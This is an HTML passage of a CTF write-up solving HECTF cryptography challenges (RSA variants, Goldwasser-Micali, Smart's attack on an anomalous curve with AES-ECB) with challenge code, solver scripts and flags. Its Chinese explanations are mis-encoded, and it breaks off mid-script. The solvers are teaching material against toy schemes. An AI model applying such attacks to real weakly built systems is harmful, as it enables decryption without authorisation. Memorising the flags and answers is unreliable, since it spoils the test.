class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">flag = <span class="string">b&#x27;xxx&#x27;</span></span><br><span class="line">e = <span class="number">114</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">t = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q * t</span><br><span class="line">p_=<span class="built_in">pow</span>(p,<span class="number">2</span>,n)</span><br><span class="line">q_=<span class="built_in">pow</span>(q,<span class="number">2</span>,n)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p_=&#x27;</span>,p_)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q_=&#x27;</span>,q_)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n=&#x27;</span>,n)</span><br><span class="line"><span class="comment">#p_= 10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801</span></span><br><span class="line"><span class="comment">#q_= 24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369</span></span><br><span class="line"><span class="comment">#c= 946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340</span></span><br><span class="line"><span class="comment">#n= 1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843 </span></span><br></pre></td></tr></table></figure></blockquote><p>å›  $p^2&lt;n,q^2&lt;n$ï¼Œå¯ç›´æ¥å¼€æ”¾æ±‚å¾— $p,q$ åŠ $r$ã€‚</p><p>åˆ $\gcd(e,\varphi)=6$ï¼Œåˆ©ç”¨ $\gcd(\cfrac{e}{6},\varphi)=1$ å…ˆå¸¸è§„RSAè®¡ç®—å‡º $m^6$ å†å¼€æ–¹å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p_ = </span><br><span class="line">q_ = </span><br><span class="line">c = </span><br><span class="line">n = </span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = gmpy2.iroot(p_,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">q = gmpy2.iroot(q_,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">r = n//(p*q)</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">114</span></span><br><span class="line">d = inverse_mod(e//<span class="number">6</span>,f)</span><br><span class="line">mm = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">m = gmpy2.iroot(mm,<span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;Congratulation!!you_find_flag&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="rsa2"><a href="#rsa2" class="headerlink" title="rsa2"></a>rsa2</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, hint, e1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mygenerate</span>():</span><br><span class="line"> <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">     p = getPrime(<span class="number">512</span>)</span><br><span class="line">     <span class="keyword">if</span> p % <span class="number">8</span> == <span class="number">5</span>:</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"> g = p-random.randint(<span class="number">1</span> &lt;&lt; <span class="number">13</span>, <span class="number">1</span> &lt;&lt; <span class="number">15</span>)</span><br><span class="line"> q = sympy.nextprime(math.gamma(g+<span class="number">1</span>) % p)</span><br><span class="line"> <span class="keyword">return</span> p, g, q</span><br><span class="line"></span><br><span class="line">p, g, q = mygenerate()</span><br><span class="line">n = p*q</span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">m1 = bytes_to_long(flag)</span><br><span class="line">m2 = bytes_to_long(hint)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e1, p)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e2, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>+<span class="built_in">str</span>(p))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;g =&#x27;</span>+<span class="built_in">str</span>(g))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c1 =&#x27;</span>+<span class="built_in">str</span>(c1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2 =&#x27;</span>+<span class="built_in">str</span>(c2))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909</span></span><br><span class="line"><span class="string">g =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766</span></span><br><span class="line"><span class="string">c1 =6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528</span></span><br><span class="line"><span class="string">c2 =11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>ç´ å› å­çš„ç”Ÿæˆå‡½æ•°ä¸­ï¼Œ</p><p>$q=\text{nextprime}(\Gamma(g+1) \bmod p)=\text{nextprime}(g! \bmod p)=\text{nextprime}((p-r)! \bmod p)$</p><p>ç»“åˆå¨å°”é€Šå®šç† $(p-2)! \equiv 1 \pmod p$ï¼Œæœ‰</p><p>$q = \text{nextprime}(\prod\limits_{k=2}^{r-1}(p-k)^{-1} \bmod p)$</p><p>æ±‚å‡º $p,q$ ï¼ŒRSAè§£å¯†å¾—hintï¼š$e_1=2$ï¼Œå†è§£å¯†å¾— $m$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">p =<span class="number">8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909</span></span><br><span class="line">g =<span class="number">8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766</span></span><br><span class="line">c1 =<span class="number">6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528</span></span><br><span class="line">c2 =<span class="number">11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627</span></span><br><span class="line">r = p-g</span><br><span class="line">q = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,r):</span><br><span class="line">    q = q*inverse_mod(p-k,p)%p</span><br><span class="line">q = sympy.nextprime(q)</span><br><span class="line">n = p*q</span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d2 = inverse_mod(e2,f)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2,d2,n)</span><br><span class="line">hint = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m2)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(hint)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Here, e1=2, think about whether you can still use rsa to solve problems&#x27;</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">2</span></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = x ^ e1 - c1</span><br><span class="line">x = f.monic().roots()[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">flag= <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(x)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;Happy_120th_birthday_to_Hebei_Normal_University&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="onebit"><a href="#onebit" class="headerlink" title="onebit"></a>onebit</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Le</span>(<span class="params">n, p</span>):</span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">pow</span>(n, (p - <span class="number">1</span>) // <span class="number">2</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">message, n, g</span>):</span><br><span class="line"> ciphertext = []</span><br><span class="line"> <span class="keyword">for</span> i, m <span class="keyword">in</span> <span class="built_in">enumerate</span>(message):</span><br><span class="line">     k = random.randint(<span class="number">1</span>, <span class="number">2</span>**<span class="number">512</span>)</span><br><span class="line">     c = ((g**<span class="built_in">int</span>(m)) * (k ** <span class="number">2</span>)) % n</span><br><span class="line">     ciphertext.append(c)</span><br><span class="line"> <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"> g = getPrime(<span class="number">512</span>)</span><br><span class="line"> <span class="keyword">if</span> Le(g, p) == p-<span class="number">1</span> <span class="keyword">and</span> Le(g, q) == q-<span class="number">1</span>:</span><br><span class="line">     <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">m = <span class="built_in">str</span>(<span class="built_in">bin</span>(m))[<span class="number">2</span>:]</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">c = Encrypt(m, n, g)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(p)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(g)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(c))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></blockquote><p>åŠ å¯†ç»“æœ $c=g^mk^2$ï¼Œç¬¦åˆGMåŒæ€åŠ å¯†ç³»ç»Ÿï¼Œåˆ†åˆ«åˆ¤æ–­ $c_i$ æ˜¯å¦ä¸ºåŸºäºæ¨¡ $p$ çš„äºŒæ¬¡å‰©ä½™å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">10314655380768703978472206709958842273413011533146844672390572314617934317138270085463277616223314361910177207125628813385040318943783776184128231730068517</span></span><br><span class="line">g = <span class="number">8263101522955373984025637723346797526375555424855735493538626380254785750558737652925053637878963928060840011944043285344527052241847201267694354571887089</span></span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    cipher = <span class="built_in">int</span>(k)</span><br><span class="line">    <span class="keyword">if</span> gmpy2.jacobi(cipher,p) == -<span class="number">1</span>:</span><br><span class="line">        plaintext += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plaintext += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(plaintext,<span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;359dbb32-04d5d9c6-7d463ebc-741c7454&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a>mixture</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">235322474717419</span></span><br><span class="line">a=<span class="number">0</span></span><br><span class="line">b=<span class="number">8856682</span></span><br><span class="line">k=</span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">P = E.random_point()</span><br><span class="line">P.order()==p</span><br><span class="line">Q=k*P</span><br><span class="line">aes_key=k</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P:&quot;</span>,P)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Q:&quot;</span>,Q)</span><br><span class="line"><span class="comment">#P=E(180571547161769,227820272156445)</span></span><br><span class="line"><span class="comment">#Q=E(76765539897460,69715189045993)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">aes_key = <span class="string">b&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">text</span>):</span><br><span class="line"> <span class="keyword">while</span> <span class="built_in">len</span>(text) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">     text += <span class="string">b&#x27; &#x27;</span></span><br><span class="line"> <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad_key</span>(<span class="params">key</span>):</span><br><span class="line"> <span class="keyword">while</span> <span class="built_in">len</span>(key) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">     key += <span class="string">b&#x27; &#x27;</span></span><br><span class="line"> <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">aes = AES.new(pad_key(aes_key), AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">plain_text = <span class="string">b&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line">enc_text = aes.encrypt(pad(plain_text))</span><br><span class="line">enc_text_b64=base64.b64encode(enc_text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc_text_b64)</span><br><span class="line"><span class="comment">#bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8=</span></span><br></pre></td></tr></table></figure></blockquote><p>ECC+AESã€‚</p><p>ECCæ»¡è¶³ $P.\text{order}()=p$ï¼Œåˆ©ç”¨Smartâ€™s Attackè§£ $k$ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">235322474717419</span></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">b = <span class="number">8856682</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">P = E(<span class="number">180571547161769</span>,<span class="number">227820272156445</span>)</span><br><span class="line">Q = E(<span class="number">76765539897460</span>,<span class="number">69715189045993</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmartAttack</span>(<span class="params">P,Q,p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P,y_P = p_times_P.xy()</span><br><span class="line">    x_Q,y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"></span><br><span class="line">k = SmartAttack(P, Q, p)</span><br><span class="line"><span class="built_in">print</span>(k)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 152675955744921</span></span><br></pre></td></tr></table></figure><p>å†ä»£å…¥è¿˜åŸAESè§£å¯†å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">aes_key = <span class="string">b&#x27;152675955744921&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(key) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        key += <span class="string">b&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">aes = AES.new(pad_key(aes_key), AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">enc_text_b64 = <span class="string">&#x27;bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8=&#x27;</span></span><br><span class="line">enc_text = base64.b64decode(enc_text_b64)</span><br><span class="line">plain_text = aes.decrypt(enc_text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plain_text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;N0w_you_know_ecc_and_AES!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="xyz"><a href="#xyz" class="headerlink" title="xyz"></a>xyz</h3><p>ç”±äºç´ æ•° $x \in (2^{11},2^{12})$ï¼Œçˆ†ç ´ $x$ ï¼Œå†è§£å…³äº $y,z$ çš„äºŒå…ƒä¸€æ¬¡æ¨¡æ–¹ç¨‹ç»„ï¼Œæ ¹æ®å¼2å°† $z$ ä»£å…¥å¼1ï¼Œå¾—åˆ°å…³äº $y$ çš„æ¨¡æ–¹ç¨‹ï¼Œçˆ†ç ´æ±‚è§£ $m_1,m_2$ï¼Œç›´åˆ°å¾—åˆ°æ»¡è¶³flagæ ¼å¼çš„å€¼å³è§£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">90269941327372741986138990624471228922188543388582792147052657918058877926048530226733915401487146960603412188605706389044850057749941283247036686933647699313789471852317821572828450212687824860596198164570332523289084374240518841959770316611451490236432102245045517406282462838053843074444594398723921432791</span></span><br><span class="line">a = <span class="number">76528144673843458522824450076110371539627923753787397683655100259800630176098551106179842548579216667636910919853615859002981078385969868960955053568271518271225085057932965836858836455161323221071080085783042898199649213810735170960799816250402517689895712143360516054216300443029075429435539217594182165579</span></span><br><span class="line">b = <span class="number">29135602763193779141406655503080226411846533327113770010672935904333289317045484412179311504151348405577659318044617676010167479271362994129802985294731037903701693595616818788260673254684442485084195062784616665615921849434909060917998818395292558822723253741815121539892159313890553027457549798418207587319</span></span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line"><span class="keyword">if</span> i.bit_length()==<span class="number">12</span> <span class="keyword">and</span> gmpy2.is_prime(i):</span><br><span class="line">s.append(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br><span class="line"></span><br><span class="line">ey = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line">    P.&lt;y&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">    z = (b - x^<span class="number">12</span> - y^<span class="number">12</span>)*inverse_mod(<span class="number">120</span>*x,p)</span><br><span class="line">    g = (<span class="number">12</span> * x + <span class="number">12</span> * y + y * z + x * z ** <span class="number">12</span>) - a</span><br><span class="line">    roots = g.monic().roots()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(roots)&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> roots:</span><br><span class="line">            ee = x</span><br><span class="line">            yy = k[<span 